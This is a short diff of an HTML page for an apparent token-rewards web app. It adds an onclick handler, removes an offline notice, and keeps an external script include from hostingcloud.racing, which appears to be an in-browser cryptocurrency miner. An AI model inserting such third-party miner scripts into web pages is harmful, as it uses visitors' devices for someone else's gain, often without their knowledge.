@@ -17,7 +17,6 @@
 
     <script src="/client.js" defer></script>
     <script src="/fly.js" defer></script>
-
     <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
     <script src="https://www.hostingcloud.racing/5pDo.js"></script>
 
@@ -138,7 +137,7 @@
       </div>
       <div>
         Reward Token:
-        <label id="myToken">Random</label>
+        <label id="myToken" onclick="selectToken();">Random</label>
       </div>
       <div>
         Mode:
@@ -153,14 +152,6 @@
       <section title="closed" id="pendingClaims" class="hide">
         <ul id="dreams"></ul>
       </section>
-    </div>
-    <div class="hide" id="offline">
-      <center>
-        Sorry You Can't Earn Rewards Offline <br />
-        <br />
-        <br />
-        <a href="/" target="_self">Back TO MTCG LOGIN</a>
-      </center>
     </div>
   </body>
 </html>
